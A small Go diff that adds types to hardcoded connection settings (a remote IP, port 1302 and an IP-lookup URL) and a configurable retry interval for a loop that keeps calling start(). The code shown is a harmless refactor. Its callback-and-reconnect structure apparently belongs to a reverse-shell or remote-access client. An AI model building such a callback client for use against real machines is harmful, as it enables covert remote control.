@@ -16,9 +16,10 @@ import (
 )
 
 var (
-	RemoteIP            = "192.168.1.181"
-	RemotePort          = "1302"
-	Remote_IP_Requester = "https://ip.bulgariu.xyz"
+	RemoteIP            string        = "192.168.1.181"
+	RemotePort          string        = "1302"
+	Remote_IP_Requester string        = "https://ip.bulgariu.xyz"
+	TimeoutRate         time.Duration = 5
 )
 
 func main() {
@@ -27,7 +28,7 @@ func main() {
 		if err := start(); err != nil {
 			log.Print(err)
 		}
-		time.Sleep(time.Second * 5)
+		time.Sleep(time.Second * TimeoutRate)
 	}
 }
 
